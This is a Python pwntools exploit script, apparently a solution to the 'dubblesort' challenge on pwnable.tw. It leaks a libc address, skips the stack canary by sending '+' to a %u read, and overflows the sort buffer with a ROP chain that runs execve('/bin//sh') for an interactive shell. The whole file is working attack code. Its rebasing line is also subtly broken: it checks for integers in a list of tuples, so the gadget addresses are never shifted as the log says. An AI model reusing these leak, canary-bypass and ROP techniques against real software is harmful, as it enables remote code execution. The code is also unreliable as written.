from pwn import *

local = True

if local:
    p = process("./dubblesort")
    #g = gdb.attach(p,"b *0x565ADAA8\nb *0x565ADB16")
else:
    p = remote("chall.pwnable.tw",10101)

libc_path = './libc_32.so.6'

log.info("[LIBC] Loading Libc: [%s]"%libc_path)

libc = ELF(libc_path)

libc_on_exit = libc.symbols["on_exit"] # 0xF7F97E24

log.info("[LIBC] Libc on_exit address [0x%s]"%libc_on_exit)


log.info("[ROP2LIBC] There is a ROPchain in %s"%libc_path)

ROPchain = [
     (0x00001aa6, "pop edx ; ret")
    ,(0x001b0040, "@ .data")
    ,(0x00023f97, "pop eax ; ret")
    ,(int(enhex('/bin'),16),'/bin')
    ,(0x0006b34b, "mov dword ptr [edx], eax ; ret")
    ,(0x00001aa6, "pop edx ; ret")
    ,(0x001b0044, "@ .data + 4")
    ,(0x00023f97, "pop eax ; ret")
    ,(int(enhex('//sh'),16),'//sh')
    ,(0x0006b34b, "mov dword ptr [edx], eax ; ret")
    ,(0x00001aa6, "pop edx ; ret")
    ,(0x001b0048, "@ .data + 8")
    ,(0x0002c5fc, "xor eax, eax ; ret")
    ,(0x0006b34b, "mov dword ptr [edx], eax ; ret")
    ,(0x00018395, "pop ebx ; ret")
    ,(0x001b0040, "@ .data")
    ,(0x000b3eb7, "pop ecx ; ret")
    ,(0x001b0048, "@ .data + 8")
    ,(0x00001aa6, "pop edx ; ret")
    ,(0x001b0048, "@ .data + 8")
    ,(0x0002c5fc, "xor eax, eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00007eec, "inc eax ; ret")
    ,(0x00002c87, "int 0x80")
]

log.info("[LEAK] Going to Leak the Libc base address.")

p.recvuntil("What your name :")

leaker = "A"*11 + "\n"

log.info("[LEAK] The leaker is %d bytes"%len(leaker))

log.info("[LEAK] Sending the leaker [\\x%s]"%'\\x'.join(x.encode('hex') for x in leaker))

p.send(leaker)

p.recvuntil("Hello ")

leak = p.recvuntil(",").split("\n")[1][:4]

log.info("[LEAK] The leaked String          is:\t[%s]"%leak)

leak = u32(leak)

log.info("[LEAK] The leaked on_exit address is:\t[0x%x]"%leak)

libc_base_address = leak - libc_on_exit

log.info("[LEAK] The Libc Base addrss       is:\t[0x%x]"%libc_base_address)

log.info("[ROP2LIBC] Updating the ROP Addresses with the Libc Base address leakerd.")

ROPchain = [r + libc_base_address if type(r) == int else r for r in ROPchain ]

p.recvuntil("sort :")

padding = 8 + int(64/4) # num_buffer + char_buffer + base_add 

numbers_to_sort = padding + len(ROPchain) # padding + ROPChaing

log.info("[BUFF_OVER] Going to input %d numbers"%numbers_to_sort)

p.sendline(str(numbers_to_sort))

log.info("[BUFF_OVER] Sending %d zeros so the stack canary is the last."%padding)

for _ in range(padding):
    p.recvuntil(":")
    p.sendline("0") 

# Bypass stack canary

log.info("[BUFF_OVER] Sending + to let the stack canary unchanged.")

p.recvuntil(":")
p.sendline("+") # + is accepted by %u but it does not write anything in the memory (Canary Bypass yay)

for value, info in ROPchain:
    log.info("[ROP2LIBC] \t%s\t%s"%(value,info))
    p.recvuntil(":")
    p.send(str(value))
    p.send("\n")

p.interactive()